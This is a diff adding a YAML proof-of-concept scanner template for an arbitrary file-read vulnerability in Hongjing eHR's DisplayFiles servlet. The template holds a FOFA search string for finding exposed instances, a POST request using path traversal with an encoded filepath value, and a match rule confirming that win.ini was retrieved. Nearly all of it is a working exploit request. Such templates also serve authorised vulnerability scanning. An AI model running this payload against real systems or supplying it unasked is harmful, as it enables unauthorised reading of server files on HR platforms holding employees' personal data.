@@ -1,0 +1,18 @@
+id: poc-yaml-hjsoft-ehr-displayfiles-anyfile-read
+info:
+  name: 宏景eHR DisplayFiles 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: POST
+  path: /templates/attestation/../../servlet/DisplayFiles
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"[extensions]")
+    && contains(headers,"filename=win.ini") && !contains(body,"<")
+variables: {}
+transport: http
